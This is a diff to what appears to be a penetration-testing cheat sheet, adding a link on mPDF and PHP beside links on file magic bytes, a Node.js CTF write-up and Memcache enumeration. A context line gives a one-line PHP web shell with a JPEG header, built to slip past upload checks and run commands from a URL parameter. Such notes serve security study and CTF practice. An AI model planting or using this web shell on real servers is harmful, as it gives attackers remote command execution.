@@ -28,10 +28,13 @@ PHP file as image  >  **echo '\xff\xd8<?=`{$_GET["cmd"]}`;' > exec.php**
 
 Magic byts [Magic byts](https://en.wikipedia.org/wiki/List_of_file_signatures)
 
+
 # Web Applictions
 
 Node.js Express framework [Node.js Express framework](https://haboob.sa/ctf/nullcon-2019/blog.html)
 
 Memcache Enumartion [Memcache](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache)
+
+mPDF and PHP [mPDF](https://github.com/mpdf/mpdf/issues/356#issue-216032258)
 
 
